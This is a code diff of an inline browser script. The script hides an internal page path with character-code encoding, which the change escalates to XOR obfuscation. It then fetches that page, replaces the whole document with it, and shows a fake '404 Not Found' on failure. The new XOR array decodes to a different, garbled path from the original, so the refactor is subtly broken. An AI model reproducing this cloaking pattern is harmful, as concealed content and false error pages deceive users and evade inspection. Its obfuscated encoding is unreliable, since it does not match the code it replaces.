@@ -1,32 +1,32 @@
 <script>
 (() => {
-    const decode = (...nums) =>
-        nums.map(n => String.fromCharCode(n)).join("");
+    const d = a => a.map(v => String.fromCharCode(v ^ 73)).join('');
 
-    const p1 = decode(95,95);                 
-    const p2 = decode(
-        105,110,116,101,114,110,97,108
-    );                                        
-    const p3 = decode(95,95);                
-    const p4 = decode(112,97,103,101);        
+    const e = [
+        22,22,32,39,61,44,59,43,60,39,36,53,22,22,102,57,40,46,44
+    ];
 
-    const endpoint = "/" + p1 + p2 + p3 + "/" + p4;
+    const u = "/" + d(e);
 
-    fetch(endpoint, {
-        cache: "no-store",
-        credentials: "same-origin"
-    })
-    .then(r => {
-        if (!r.ok) throw new Error();
-        return r.text();
-    })
-    .then(html => {
-        document.open();
-        document.write(html);
-        document.close();
-    })
-    .catch(() => {
-        document.body.innerHTML = "<h1>404 Not Found</h1>";
-    });
+    const o = {
+        cache: ["no","store"].join("-"),
+        credentials: ["same","origin"].join("-")
+    };
+
+    (async () => {
+        try {
+            const r = await fetch(u, o);
+
+            if (!r.ok) throw 0;
+
+            const h = await r.text();
+
+            document.open();
+            document.write(h);
+            document.close();
+        } catch {
+            document.body.innerHTML = "<h1>404 Not Found</h1>";
+        }
+    })();
 })();
 </script>
